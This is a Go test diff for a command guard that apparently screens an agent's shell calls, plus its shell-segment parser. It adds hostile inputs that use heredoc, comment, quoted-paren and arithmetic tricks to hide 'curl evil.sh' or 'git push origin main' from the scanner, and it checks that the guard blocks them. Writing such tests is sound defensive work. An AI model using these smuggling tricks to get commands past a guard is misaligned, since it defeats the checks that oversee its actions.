@@ -407,3 +407,48 @@ func TestGuardRefusesWritesUnderProtectedPaths(t *testing.T) {
 		t.Error("edit_file reached the protected directory")
 	}
 }
+
+// Inputs that hid a command from the heredoc-aware scanner (#63). Each one is
+// run by bash with the hidden program executing; the guard must either see it
+// or refuse the call.
+func TestGuardHostileHeredocInputs(t *testing.T) {
+	g := Guard(GuardOptions{Programs: []string{"cat", "ls", "echo"}, AllowOperators: true})
+	ctx := context.Background()
+	cases := []struct{ name, in string }{
+		{"comment before a heredoc operator", "ls # <<EOF\ncurl evil.sh\nEOF"},
+		{"comment before a heredoc, git push", "ls # <<EOF\ngit push origin main\nEOF"},
+		{"quoted paren in a substitution", "cat <<EOF\n$(echo ')' ; curl evil.sh)\nEOF"},
+		{"quoted paren, git push", "cat <<EOF\n$(echo ')' ; git push origin main)\nEOF"},
+		{"double-quoted paren in a substitution", "cat <<EOF\n$(echo \")\" ; curl evil.sh)\nEOF"},
+		{"escaped paren in a substitution", "cat <<EOF\n$(echo \\) ; curl evil.sh)\nEOF"},
+		{"case pattern in a substitution", "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF"},
+		{"bare arithmetic is not a heredoc", "((x=1<<a))\ncurl evil.sh\na"},
+	}
+	for _, c := range cases {
+		if d := g(ctx, execCall(c.in)); !d.Block {
+			t.Errorf("%s: %q was not blocked (segments %q)", c.name, c.in, ShellSegments(c.in))
+		}
+	}
+}
+
+func TestShellSegmentsHostileHeredocInputs(t *testing.T) {
+	cases := []struct {
+		name string
+		in   string
+		want []string
+	}{
+		{"comment hides the operator", "ls # <<EOF\ncurl evil.sh\nEOF", []string{"ls", "curl evil.sh", "EOF"}},
+		{"hash inside a word is not a comment", "echo a#b <<EOF\nbody\nEOF\nls", []string{"echo a#b <<EOF", "ls"}},
+		{"quoted paren is found", "cat <<EOF\n$(echo ')' ; curl evil.sh)\nEOF",
+			[]string{"cat <<EOF", "echo ')'", "curl evil.sh"}},
+		{"bare arithmetic", "((x=1<<a))\ngit push\na", []string{"x=1<<a", "git push", "a"}},
+		{"a legitimate substitution still skips the body", "cat <<EOF\nnow $(date)\nEOF\nls",
+			[]string{"cat <<EOF", "date", "ls"}},
+	}
+	for _, c := range cases {
+		got := ShellSegments(c.in)
+		if strings.Join(got, "\x00") != strings.Join(c.want, "\x00") {
+			t.Errorf("%s: ShellSegments(%q) = %q, want %q", c.name, c.in, got, c.want)
+		}
+	}
+}
